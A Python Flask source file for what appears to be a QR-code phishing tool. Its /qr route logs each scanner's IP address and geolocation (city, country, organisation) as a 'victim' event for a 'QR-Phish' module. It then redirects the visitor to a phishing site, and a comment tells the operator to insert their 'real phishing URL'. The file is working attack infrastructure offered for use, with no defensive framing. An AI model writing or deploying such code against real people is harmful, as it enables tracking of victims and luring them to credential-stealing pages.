from flask import Flask, redirect, request
import sys, os

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from core.logger import log_event
from core.ip_locator import get_ip_info  # 🔹 New import

app = Flask(__name__)

# Victim QR redirect route
@app.route('/qr')
def qr_redirect():
    victim_ip = request.remote_addr
    ip_info = get_ip_info(victim_ip)  # 🔹 Get geolocation info

    log_event({
        "module": "QR-Phish",
        "ip": victim_ip,
        "city": ip_info.get("city"),
        "country": ip_info.get("country"),
        "org": ip_info.get("org"),
        "event": "QR scanned by victim"
    })

    return redirect("https://your-phishing-site.com")  # 🔁 Change this to your real phishing URL

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001)

